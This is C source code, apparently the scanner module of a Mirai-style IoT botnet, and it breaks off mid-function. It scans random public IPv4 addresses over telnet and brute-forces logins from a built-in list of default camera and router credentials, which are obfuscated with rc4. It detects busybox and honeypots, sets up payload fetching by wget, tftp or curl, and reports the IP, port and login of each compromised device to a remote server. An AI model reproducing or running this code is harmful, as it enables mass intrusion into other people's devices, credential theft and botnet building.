#define _GNU_SOURCE

#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

#include "dbg.h"
#include "bool.h"
#include "hide.h"
#include "util.h"
#include "rand.h"
#include "table.h"
#include "resolve.h"
#include "connection.h"

#ifdef HIK
#define MAX_FDS 128
#else
#define MAX_FDS 512
#endif

#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

typedef struct {
    char *username, *password;
    uint8_t username_len, password_len;
} auth_t;

static int auth_index = 0;
static auth_t *auth = NULL;

typedef struct {
    int fd;
	struct sockaddr_in addr;
    auth_t *auth;
    BOOL *used;

    enum {
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_BUSYBOX_RESP,
        SC_WAITING_HONEYPOT_RESP,
        SC_WAITING_BINARY_DOMAIN,
        SC_WAITING_PAYLOAD,
        SC_WAITING_EXEC_MSG
    } state;

    uint8_t tries;
    time_t last_recv;

    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];

    enum {
        WGET,
        TFTP,
        FTPGET,
        CURL
    } payload_state;

    BOOL binary_ran;

} conn_t;

static conn_t *conn = NULL;
static time_t fake_time;

static uint8_t passwd_resp[] = {
    TABLE_INCORRECT,
    TABLE_INVALID,
    TABLE_BAD,
    TABLE_WRONG,
    TABLE_FAIL,
    TABLE_DENIED,
    TABLE_ERROR,
    TABLE_RETRY
};

static uint8_t shell_activation[] = {
    TABLE_ENABLE,
    TABLE_SYSTEM,
    TABLE_SHELL,
    TABLE_SH,
    TABLE_LINUXSHELL,
    TABLE_PINGSH
};

static char domain_ipv4[16] = {0};
static uint8_t domain_ipv4_len = 0;

static struct {
    char *dir;
    int len;
} writeable_dirs[] = {
    {"/tmp/", 5},
    {"/var/", 5},
    {"/var/tmp/", 9},
    {"/var/run/", 9},
    {"/dev/", 5},
    {"/dev/shm/", 9},
    {"/data/", 6},
    {"/etc/", 5},
    {"/mnt/", 5},
    {"/usr/", 5},
    {"/boot/", 6},
    {"/home/", 6},
    {"/root/", 6},
};

static void add_combo(char *username, char *password, int username_len, int password_len) {

    auth = realloc(auth, (auth_index + 1) * sizeof(auth_t));

    auth[auth_index].username = calloc(username_len + 1, sizeof(char));
    memcpy(auth[auth_index].username, username, username_len);

    auth[auth_index].password = calloc(password_len + 1, sizeof(char));
    memcpy(auth[auth_index].password, password, password_len);

    auth[auth_index].username_len = username_len;
    auth[auth_index].password_len = password_len;

    rc4(auth[auth_index].username, auth[auth_index].username_len);
    rc4(auth[auth_index].password, auth[auth_index].password_len);

    auth_index++;
}

static void combos_init(void) {
    add_combo("\x7C\x69\x90\x44\xD3", "", 5, 0); // Admin:
    add_combo("\xCE\x1B\x32\x36\x61\x76\xCC\xFB\xCD\x0E\xBB\x00\x7D", "\x51\xCE\x84\xFE\x58\x19\xA5", 13, 7); // Administrator:Vision2
    add_combo("\x5C\x69\x90\x44\xD3", "\x63\x76\x7F\x2B\x4C\x53", 5, 6); // admin:admin1
    add_combo("\xBA\x5F\x78\x4D\x8E\xCF\xAD\x11\x6E\x6C\x8D\xA9", "\xA0\xC2\x13\xA7\x52\x84\xD2\x40", 12, 8); // vstarcam2015:20150602
    add_combo("\xB8\x49\x60\x49\x9F\xC3\xA1\x1D\x38\x31\xD5\xF2", "\xAD\x48\x61\x45\x92\xD8\xA9\x10\x39\x3F\xD3\xF1", 12, 12); // telecomadmin:admintelecom
    add_combo("\x8D\x9C\x75\xD7\x9C\xFD\xA8\xAD\xB4\x50\xB7", "\x8D\x9C\x75\xD7\x9C\xFD\xA8\xAD\xB4\x50\xB7", 11, 11); // telnetadmin:telnetadmin
    add_combo("\x98\xFE\x18\x3F", "\x98\xFE\x18\x3F", 4, 4); // user:user
    add_combo("\x9F\xE2\x12\x39", "", 4, 0); // root:
    add_combo("\x9F\xE2\x12\x39", "\x52\x7D\x7C\x77\x10\x53", 4, 6); // root:Pon521
    add_combo("\x9F\xE2\x12\x39", "\x5D\xDF\x9E\xF4\x02\x45\xA6", 4, 7); // root:Zxic521
    add_combo("\x9F\xE2\x12\x39", "\x58\x66\x77\x77\x10\x53", 4, 6); // root:Zte521
    add_combo("\x9F\xE2\x12\x39", "\xD4\x9B\x50\xF7\x0B\xC6\x97\x02", 4, 8); // root:Fireitup
    add_combo("\x9F\xE2\x12\x39", "\xD4\x9D\x41\xE7\x11\xDA\x8C\x01", 4, 8); // root:Focushns
    add_combo("\x9F\xE2\x12\x39", "\xD1\x99\x46\xF5\x17\xC1\xD3\x43", 4, 8); // root:Ckdgus11
    add_combo("\x9F\xE2\x12\x39", "\x4B\x64\x87\x55\xCB", 4, 5); // root:vizxv
    add_combo("\x9F\xE2\x12\x39", "\x70\xC6\x95\xFD\x43\x16\xFA", 4, 7); // root:wabjtam
    add_combo("\x9F\xE2\x12\x39", "\x35\x82\x46\x5E\x98\xFF\xE6\x3E\x6F", 4, 9); // root:tsgoingon
    add_combo("\x9F\xE2\x12\x39", "\x73\xC6\xAD\xED\x77\x47\xA6", 4, 7); // root:taZz@01
    add_combo("\x9F\xE2\x12\x39", "\xE7\x9C\x4B\xE1\x0A\xD7\x87\x1C", 4, 8); // root:unisheen
    add_combo("\x9F\xE2\x12\x39", "\x9F\xE2\x12\x39", 4, 4); // root:root
    add_combo("\x9F\xE2\x12\x39", "\x75\xC8\x98\xE3\x06\x45\xA4", 4, 7); // root:root123
    add_combo("\x9F\xE2\x12\x39", "\x75\xC8\x98\xE3\x01\x45\xA6", 4, 7); // root:root621
    add_combo("\x9F\xE2\x12\x39", "\x71\x6B\x61\x36\x47\x0F", 4, 6); // root:system
    add_combo("\x9F\xE2\x12\x39", "\x71\x60\x23\x70\x11\x56", 4, 6); // root:sr1234
    add_combo("\x9F\xE2\x12\x39", "\x74\xC8\x9B\xF8\x5C\x12\xEE", 4, 7); // root:solokey
    add_combo("\x9F\xE2\x12\x39", "\xE2\x93\x51\xE1\x15\xDD\x90\x16", 4, 8); // root:password
    add_combo("\x9F\xE2\x12\x39", "\x47\x61\x85\x55\x93", 4, 5); // root:zlxx.
    add_combo("\x9F\xE2\x12\x39", "\x7A\x7B\x60\x36\x43\x0F", 4, 6); // root:xirtam
    add_combo("\x9F\xE2\x12\x39", "\x7F\xCA\x9F\xF3\x5E\x07\xF4", 4, 7); // root:xmhdipc
    add_combo("\x9F\xE2\x12\x39", "\x7F\xC4\xC6\xA5\x04\x43\xA2", 4, 7); // root:xc12345
    add_combo("\x9F\xE2\x12\x39", "\x7A\x71\x21\x77\x13\x53", 4, 6); // root:xc3511
    add_combo("\x9F\xE2\x12\x39", "\x27\x9E\x54\x5F\x95\xF4\xF3\x69\x39", 4, 9); // root:founder88
    add_combo("\x9F\xE2\x12\x39", "\x63\xC2\x91\xF6\x42\x1B\xE3", 4, 7); // root:default
    add_combo("\x9F\xE2\x12\x39", "\xF7\xC3\x12\xF3\x06\xD1\xD1\x4B", 4, 8); // root:e10adc39
    add_combo("\x9F\xE2\x12\x39", "\x64\xDF\x9B\xFE\x59\x02\xEF", 4, 7); // root:cxlinux
    add_combo("\x9F\xE2\x12\x39", "\x8C\xFD\x14\x35", 4, 4); // root:apix
    add_combo("\x9F\xE2\x12\x39", "\x63\x7C\x66\x31\x4E\x13", 4, 6); // root:antslq
    add_combo("\x9F\xE2\x12\x39", "\x5C\x69\x90\x44\xD3", 4, 5); // root:admin
    add_combo("\x9F\xE2\x12\x39", "\xEE\x1B\x32\x36\x61\x6F\xDE\xFC\xCC\x18\xA0\x1D\x6B", 4, 13); // root:adminpassword
    add_combo("\x9F\xE2\x12\x39", "\xAD\x1D\x7F\x49\x8A\x99\xB5\x4B\x3F\x6F\x85\xF7", 4, 12); // root:a1sev5y7c39k
    add_combo("\x9F\xE2\x12\x39", "\xFC\x97\x55\xFD\x10\xD3\x8C\x15", 4, 8); // root:neworang
    add_combo("\x9F\xE2\x12\x39", "\xE1\x1A\x28\x30\x7D\x7E\xD1\xE8\xDA\x1B\xAA\x0C\x67", 4, 13); // root:neworangetech
    add_combo("\x9F\xE2\x12\x39", "\x1F\xE4\xF6\x3E\xA3\xB0\x9F\x36\x64\x79\x49\x99\x49\xB9\x29\x59\xD9", 4, 17); // root:neworange88888888
    add_combo("\x9F\xE2\x12\x39", "\x6B\x71\x08\x3D\xFA\x71\x4C\xF5\x96\x67", 4, 10); // root:oelinux123
    add_combo("\x9F\xE2\x12\x39", "\x6F\x61\x21\x76\x17\x54", 4, 6); // root:ms3456
    add_combo("\x9F\xE2\x12\x39", "\x6C\x67\x08\x23\xFD\x62\x5D\xA7\xC5\x39", 4, 10); // root:hslwificam
    add_combo("\x9F\xE2\x12\x39", "\x29\x9A\x48\x41\x92\xA3\xB1\x60\x37", 4, 9); // root:hkipc2016
    add_combo("\x9F\xE2\x12\x39", "\xFB\x91\x43\xE6\x01\xDA\xDB\x4B", 4, 8); // root:icatch99
    add_combo("\x9F\xE2\x12\x39", "\x31\x61\xB4", 4, 3); // root:5up
    add_combo("\x9F\xE2\x12\x39", "\xA0\xC2\x13\xA3\x14\xC1\x96\x13", 4, 8); // root:2011vsta
    add_combo("\x9F\xE2\x12\x39", "\xA2\xC5\x12\xF3\x06\xDF\x8B\x1C", 4, 8); // root:070admin
    add_combo("\x9F\xE2\x12\x39", "\xA3\xC2\x12\xA3\x01\xDA\x8B\x1C", 4, 8); // root:1001chin
    add_combo("\x9F\xE2\x12\x39", "\xDC\xBF\x4E\x79", 4, 4); // root:1234
    add_combo("\x9F\xE2\x12\x39", "\x0C\x3F\xCE\x19\x88", 4, 5); // root:12345
    add_combo("\x9F\xE2\x12\x39", "\x33\x20\x21\x76\x17\x54", 4, 6); // root:123456
    add_combo("\x9F\xE2\x12\x39", "\x35\x26\x57\x60\xFC\x6B\x46\xB7\xC1\x27", 4, 10); // root:1234horses
    add_combo("\x9F\xE2\x12\x39", "\xA3\xDC\x4D\xDC\x47\xD1\x92\x1B", 4, 8); // root:1.oN%cpi
    add_combo("\x9F\xE2\x12\x39", "\xBD\xD8\x14\xBC\x5F\xED\x88\x13", 4, 8); // root:/*6.=_ja
    add_combo("\x77\x61\x14\x31\xE6\x65\x50\xA9\xCD\x3A", "\x85\x5F\x28\x59\x8C\xC9\xBE\x3C\x38\x31\xD5\xF2", 10, 12); // superadmin:Is$uper@dmin
    add_combo("\x74\xD2\x87\xE7\x58\x05\xE3", "\x74\xD2\x87\xE7\x58\x05\xE3", 7, 7); // support:support
    add_combo("\x62\x60\xB4", "\x62\x60\xB4", 3, 3); // ftp:ftp
    add_combo("\x5A\x78\x98\x5E\xC9", "\x5A\x78\x98\x5E\xC9", 5, 5); // guest:guest
    add_combo("\x5A\x78\x98\x5E\xC9", "\x33\x20\x21\x76\x17\x54", 5, 6); // guest:123456
    add_combo("\x66\x73\x77\x2F\x4D\x0C", "\x66\x73\x77\x2F\x4D\x0C", 6, 6); // daemon:daemon
    add_combo("\x63\xC2\x91\xF6\x42\x1B\xE3", "\x63\xC2\x91\xF6\x42\x1B\xE3", 7, 7); // default:default
    add_combo("\x66\x7D\xAA", "\x66\x7D\xAA", 3, 3); // bin:bin
    add_combo("\x5C\x69\x90\x44\xD3", "", 5, 0); // admin:
    add_combo("\x5C\x69\x90\x44\xD3", "\x43\x71\x2A\x31\xCC\x6D\x67\x84\x95\x6D", 5, 10); // admin:GeNeXiS@19
    add_combo("\x5C\x69\x90\x44\xD3", "\x46\x66\x25\x3C\xD9\x6B\x67\x84\x95\x61", 5, 10); // admin:BrAhMoS@15
    add_combo("\x5C\x69\x90\x44\xD3", "\x6A\x09\x9E\xE8\x59\xD4\xCE\xB9\x49\x97\xC8\xF7\xAF\x9D\xBE\xFF", 5, 16); // admin:vertex25ektks123
    add_combo("\x5C\x69\x90\x44\xD3", "\x73\x65\x73\x31\x58\x1A", 5, 6); // admin:qwaszx
    add_combo("\x5C\x69\x90\x44\xD3", "\xE3\x85\x43\xE1\x18\xCA\x92\x1D", 5, 8); // admin:qwaszxpo
    add_combo("\x5C\x69\x90\x44\xD3", "\x5C\x69\x90\x44\xD3", 5, 5); // admin:admin
    add_combo("\x5C\x69\x90\x44\xD3", "\xF3\x96\x4F\xFB\x0C\x83\xD0\x41", 5, 8); // admin:admin123
    add_combo("\x5C\x69\x90\x44\xD3", "\x65\x70\x09\x3D\xFA\x65\x50\xA9\xCD\x3A", 5, 10); // admin:adminadmin
    add_combo("\x5C\x69\x90\x44\xD3", "\xFB\x59\x66\x61\x97\xC3\xFC\x1D\x38\x31\xD5\xF2", 5, 12); // admin:7ujMko0admin
    add_combo("\x5C\x69\x90\x44\xD3", "\xDC\xBF\x4E\x79", 5, 4); // admin:1234
    add_combo("\x5C\x69\x90\x44\xD3", "\x0C\x3F\xCE\x19\x88", 5, 5); // admin:12345
    add_combo("\x65\x70\xA9", "\x65\x70\xA9", 3, 3); // adm:adm
    add_combo("\x6C\x7D\x70\x2D\x46\x1B", "\x6C\x7D\x70\x2D\x46\x1B", 6, 6); // nobody:nobody
    add_combo("\x29\x98\x4A\x47\x98\xE2\xE8\x3E\x6F", "\x29\x98\x4A\x47\x98\xE2\xE8\x3E\x6F", 9, 9); // hikvision:hikvision
}

static uint32_t rand_ipv4(void) {

    uint8_t buf[4] = {0};

    for (int i = 0; i < 4; i++)
        buf[i] = rand_next() & 0xff;

    while (!buf[0] || buf[0] == 127 || buf[0] == 10 || buf[0] >= 224 || (buf[0] == 172 && buf[1] >= 16 && buf[1] <= 31) || (buf[0] == 192 && buf[1] == 168) || (buf[0] == 100 && buf[1] >= 64 && buf[1] <= 127) || (buf[0] == 169 && buf[1] == 254) || (buf[0] == 198 && buf[1] >= 18 && buf[1] <= 19))
        buf[0] = rand_next() & 0xff;

    return INET_ADDR(buf[0], buf[1], buf[2], buf[3]);
}

static auth_t *get_random_auth(int loc) {

    int unused_count = 0, unused_indices[auth_index];

    for (int i = 0; i < auth_index; i++) {
        if (!conn[loc].used[i])
            unused_indices[unused_count++] = i;
    }

    int auth_loc = unused_indices[rand_next() % unused_count];

    conn[loc].used[auth_loc] = TRUE;
    return &auth[auth_loc];
}


static void setup_connection(int loc) {

    if ((conn[loc].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;

    fcntl(conn[loc].fd, F_SETFL, O_NONBLOCK | fcntl(conn[loc].fd, F_GETFL, 0));

    conn[loc].last_recv = fake_time;
    conn[loc].auth = get_random_auth(loc);

    connect(conn[loc].fd, (struct sockaddr *)&conn[loc].addr, sizeof(conn[loc].addr));
}

static void close_fd(int loc) {

    close(conn[loc].fd);
	conn[loc].fd = -1;
    conn[loc].state = 0;
    conn[loc].rdbuf_pos = 0;
    memset(conn[loc].rdbuf, 0, sizeof(conn[loc].rdbuf));
    conn[loc].payload_state = 0;
    conn[loc].binary_ran = FALSE;

}

static BOOL can_consume(int loc, uint8_t *ptr, int amount) {

    uint8_t *end = (uint8_t *)conn[loc].rdbuf + conn[loc].rdbuf_pos;
    return ptr + amount < end;
}

static int consume_iacs(int loc) {

    int consumed = 0;
    uint8_t *ptr = (uint8_t *)conn[loc].rdbuf;

    while (consumed < conn[loc].rdbuf_pos) {
        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff) {
            if (!can_consume(loc, ptr, 1))
                break;
            if (ptr[1] == 0xff) {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd) {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(loc, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn[loc].fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn[loc].fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else {
            iac_wont:
                if (!can_consume(loc, ptr, 2))
                    break;

                for (int i = 0; i < 3; i++) {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn[loc].fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_login_prompt(int loc) {

    for (int i = conn[loc].rdbuf_pos - 1; i >= 0; i--) {
        if (conn[loc].rdbuf[i] == ':')
            return i + 1;
    }

    return 0;
}

static int consume_shell_prompt(int loc) {

    for (int i = conn[loc].rdbuf_pos - 1; i >= 0; i--) {
        if (conn[loc].rdbuf[i] == ':' || conn[loc].rdbuf[i] == '>' || conn[loc].rdbuf[i] == '$' || conn[loc].rdbuf[i] == '#' || conn[loc].rdbuf[i] == '%')
            return i + 1;
    }

    return 0;
}

static int consume_password_resp(int loc) {

    int ret = 0;

    for (unsigned int i = 0; i < (sizeof(passwd_resp) / sizeof(passwd_resp[0])); i++) {
        table_unlock_val(passwd_resp[i]);
        ret = util_memsearch(conn[loc].rdbuf, conn[loc].rdbuf_pos, table[passwd_resp[i]].str, table[passwd_resp[i]].len);
        table_lock_val(passwd_resp[i]);

        if (ret)
            break;
    }

    return ret ? -1 : consume_shell_prompt(loc);
}

static int consume_busybox_resp(int loc) {

    table_unlock_val(TABLE_BUSYBOX_RESP);
    int ret = util_memsearch(conn[loc].rdbuf, conn[loc].rdbuf_pos, table[TABLE_BUSYBOX_RESP].str, table[TABLE_BUSYBOX_RESP].len);
    table_lock_val(TABLE_BUSYBOX_RESP);

    return ret;
}

static int consume_honeypot_resp(int loc) {

    table_unlock_val(TABLE_HONEYPOT_RESP);
    int ret = util_memsearch(conn[loc].rdbuf, conn[loc].rdbuf_pos, table[TABLE_HONEYPOT_RESP].str, table[TABLE_HONEYPOT_RESP].len);
    table_lock_val(TABLE_HONEYPOT_RESP);

    return ret;
}

static void fetch_domain_ipv4(void) {

    table_unlock_val(TABLE_BINS_DOMAIN);

    for (int i = 0; i < 10; i++) {
        struct dns_result result = resolve_domain(table[TABLE_BINS_DOMAIN].str, TRUE);

        if (!result.count) {
            DEBUG_PRINT("[fetch_domain_ipv4] failed to resolve domain %d/10\n", i + 1);
            continue;
        }

        strcpy(domain_ipv4, inet_ntoa((struct in_addr){(result.ips[0])}));
        domain_ipv4_len = strlen(domain_ipv4);

        free_dns_result(&result);
        break;
    }

    table_lock_val(TABLE_BINS_DOMAIN);

    /*
        check to ensure the http server is still online
        also ensures the device that it got bruted from isn't blocking our server
        even if the device we bruted isn't blocking our server, it should get sent to the scanlisten anyway
    */

    if (domain_ipv4_len) {

        int fd = socket(AF_INET, SOCK_STREAM, 0);

        if (fd == -1) {
            DEBUG_PRINT("[fetch_domain_ipv4] socket() failed\n");
            domain_ipv4_len = 0;
            return;
        }

        struct timeval tv = {
            .tv_sec = 1,
            .tv_usec = 0
        };

        if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) == -1) {
            DEBUG_PRINT("[fetch_domain_ipv4] setsockopt() for send failed\n");
            domain_ipv4_len = 0;
            close(fd);
            return;
        }

        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port = htons(80),
            .sin_addr.s_addr = inet_addr(domain_ipv4)
        };

        DEBUG_PRINT("[fetch_domain_ipv4] addr.sin_addr.s_addr: (\"%s\")\n", inet_ntoa((struct in_addr){(addr.sin_addr.s_addr)}));

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
            DEBUG_PRINT("[fetch_domain_ipv4] connect() failed\n");
            domain_ipv4_len = 0;
            close(fd);
            return;
        }

        DEBUG_PRINT("[fetch_domain_ipv4] connect() successful\n");

        close(fd);
    }
}


static void report_working(struct sockaddr_in addr_arg, auth_t *auth) {
    int fd = -1;

    fetch_domain_ipv4();

    if (domain_ipv4_len) {

        fd = socket(AF_INET, SOCK_STREAM, 0);

        if (fd == -1) {
            DEBUG_PRINT("[report_working] socket() failed\n");
            return;
        }

        struct timeval tv = {
            .tv_sec = 1,
            .tv_usec = 0
        };

        if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) == -1) {
            DEBUG_PRINT("[report_working] setsockopt() for send failed\n");
            close(fd);
            return;
        }

        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port = htons(6636),
            .sin_addr.s_addr = inet_addr(domain_ipv4)
        };

        DEBUG_PRINT("[report_working] addr.sin_addr.s_addr: (\"%s\")\n", inet_ntoa((struct in_addr){(addr.sin_addr.s_addr)}));

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
            DEBUG_PRINT("[report_working] connect() failed\n");
            close(fd);
            return;
        }

        DEBUG_PRINT("[report_working] connect() successful\n");

        uint8_t zero = 0;
        send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
        send(fd, &addr_arg.sin_addr.s_addr, sizeof(uint32_t), MSG_NOSIGNAL);
        send(fd, &addr_arg.sin_port, sizeof(uint16_t), MSG_NOSIGNAL);
        send(fd, &(auth->username_len), sizeof(uint8_t), MSG_NOSIGNAL);
        send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
        send(fd, &(auth->password_len), sizeof(uint8_t), MSG_NOSIGNAL);
        send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

        DEBUG_PRINT("[report_working] send() device to scanListen, exit()\n");

        close(fd);
    }
}

static int consume_exec_resp(int loc) {

    if (!conn[loc].binary_ran) {

        if (util_memsearch(conn[loc].rdbuf, conn[loc].rdbuf_pos, ".data", 5)) // searching for ".data"
            conn[loc].binary_ran = TRUE;

        if (conn[loc].binary_ran)
            return 1;
    }

    return consume_busybox_resp(loc);
}

static void scanner(void) {

    combos_init();

#ifdef DEBUG_COMBOS
    for (int i = 0; i < auth_index; i++)
        DEBUG_PRINT("index: (\'%d\') | username: (\"%s\") | username_len: (\'%d\') | password: (\"%s\") | password_len: (\'%d\')\n", i, auth[i].username, auth[i].username_len, auth[i].password, auth[i].password_len);
#endif

    conn = calloc(MAX_FDS, sizeof(conn_t));

    for (int i = 0; i < MAX_FDS; i++) {
        conn[i].fd = -1;
        conn[i].used = realloc(conn[i].used, auth_index * sizeof(BOOL));
    }

    fake_time = time(NULL);

    while (TRUE) {
        for (int i = 0; i < MAX_FDS; i++) {
            if (conn[i].fd > -1)
                continue;

            struct sockaddr_in addr = {
				.sin_family = AF_INET,
				.sin_port = htons(23),
				.sin_addr.s_addr = rand_ipv4()
            };

            for (int j = 0; j < auth_index; j++)
		        conn[i].used[j] = FALSE;

            conn[i].tries = 0;
            conn[i].addr = addr;
            setup_connection(i);
        }

        int fd = -1;

        fd_set rdfd, wrfd;
		FD_ZERO(&rdfd);
		FD_ZERO(&wrfd);

        for (int i = 0; i < MAX_FDS; i++) {
            if (conn[i].fd == -1)
                continue;

            if (fake_time - conn[i].last_recv > (conn[i].state >= SC_WAITING_EXEC_MSG ? 60 : 10)) {
                if (conn[i].state == SC_WAITING_EXEC_MSG) {
                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") failed to run file, send() CTRL + C and CTRL + Z\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                    send(conn[i].fd, "\x03", 1, MSG_NOSIGNAL);
                    send(conn[i].fd, "\x1A", 1, MSG_NOSIGNAL);

                    table_unlock_val(TABLE_BUSYBOX);
                    send(conn[i].fd, table[TABLE_BUSYBOX].str, table[TABLE_BUSYBOX].len, MSG_NOSIGNAL);
                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                    table_lock_val(TABLE_BUSYBOX);
                }
                else {
                    close_fd(i);
                    continue;
                }
            }

            if (conn[i].fd > fd)
                fd = conn[i].fd;

            if (conn[i].state == SC_CONNECTING)
				FD_SET(conn[i].fd, &wrfd);
			else
				FD_SET(conn[i].fd, &rdfd);
        }

        struct timeval tv = {
            .tv_sec = 1,
            .tv_usec = 0
        };

        sleep(1);
        select(fd + 1, &rdfd, &wrfd, NULL, &tv);
        fake_time = time(NULL);

        for (int i = 0; i < MAX_FDS; i++) {
            if (conn[i].fd == -1)
                continue;

            if (FD_ISSET(conn[i].fd, &wrfd)) {
                int err, ret;
                socklen_t len = sizeof(int);

                ret = getsockopt(conn[i].fd, SOL_SOCKET, SO_ERROR, &err, &len);

                if (!err && !ret)
                    conn[i].state = SC_HANDLE_IACS;
                else
                    close_fd(i);
            }
            else if (FD_ISSET(conn[i].fd, &rdfd)) {
                while (TRUE) {
                    if (conn[i].fd == -1)
                        break;

                    if (conn[i].rdbuf_pos == SCANNER_RDBUF_SIZE) {
                        memmove(conn[i].rdbuf, conn[i].rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn[i].rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    int ret = recv(conn[i].fd, conn[i].rdbuf + conn[i].rdbuf_pos, SCANNER_RDBUF_SIZE - conn[i].rdbuf_pos, MSG_NOSIGNAL);

                    if (ret <= 0) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                            close_fd(i);
                        
                        break;
                    }

                    // DEBUG_PRINT("rdbuf: (%s)\n", conn[i].rdbuf);

                    conn[i].rdbuf_pos += ret;
                    conn[i].last_recv = fake_time;

                    while (TRUE) {
                        int consumed = 0;

                        switch (conn[i].state) {
                            case SC_HANDLE_IACS:
                                if ((consumed = consume_iacs(i)) > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') finished telnet negotiation\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port));
                                 
                                    conn[i].state = SC_WAITING_USERNAME;
                                }
                                break;
                            case SC_WAITING_USERNAME:
                                if ((consumed = consume_login_prompt(i)) > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') send() username: (\"%s\")\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username);
                                    
                                    send(conn[i].fd, conn[i].auth->username, conn[i].auth->username_len, MSG_NOSIGNAL);
                                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                    conn[i].state = SC_WAITING_PASSWORD;
                                }
                                break;
                            case SC_WAITING_PASSWORD:
                                if ((consumed = consume_login_prompt(i)) > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') send() password: (\"%s\")\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->password);

                                    send(conn[i].fd, conn[i].auth->password, conn[i].auth->password_len, MSG_NOSIGNAL);
                                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);

                                    conn[i].state = SC_WAITING_PASSWD_RESP;
                                }
                                break;
                            case SC_WAITING_PASSWD_RESP:
                                consumed = consume_password_resp(i);

                                if (consumed == -1) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') incorrect login: (\"%s\":\"%s\") brute attempt: (\'%d\')\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password, (conn[i].tries + 1));

                                    close_fd(i);
 
                                    if (++conn[i].tries < auth_index)
                                        setup_connection(i);
                                }
                                else if (consumed > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') send() shell activation\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port));

                                    for (unsigned int i = 0; i < (sizeof(shell_activation) / sizeof(shell_activation[0])); i++) {
                                        table_unlock_val(shell_activation[i]);
                                        send(conn[i].fd, table[shell_activation[i]].str, table[shell_activation[i]].len, MSG_NOSIGNAL);
                                        send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                        table_lock_val(shell_activation[i]);
                                    }

                                    conn[i].state = SC_WAITING_SH_RESP;
                                }
                                break;
                            case SC_WAITING_SH_RESP:
                                if ((consumed = consume_shell_prompt(i)) > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') send() busybox check\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port));

                                    table_unlock_val(TABLE_BUSYBOX);
                                    send(conn[i].fd, table[TABLE_BUSYBOX].str, table[TABLE_BUSYBOX].len, MSG_NOSIGNAL);
                                    send(conn[i].fd, "\r\n", 2, MSG_NOSIGNAL);
                                    table_lock_val(TABLE_BUSYBOX);

                                    conn[i].state = SC_WAITING_BUSYBOX_RESP;
                                }
                                break;
                            case SC_WAITING_BUSYBOX_RESP:
                                if ((consumed = consume_busybox_resp(i)) > 0) {

                                    DEBUG_PRINT("[scanner] fd: (\'%d\') | addr: (\"%s\":\'%d\') | auth: (\"%s\":\"%s\") recv() busybox response\n", conn[i].fd, inet_ntoa((struct in_addr){conn[i].addr.sin_addr.s_addr}), ntohs(conn[i].addr.sin_port), conn[i].auth->username, conn[i].auth->password);

                                    table_unlock_val(TABLE_HONEYPOT);
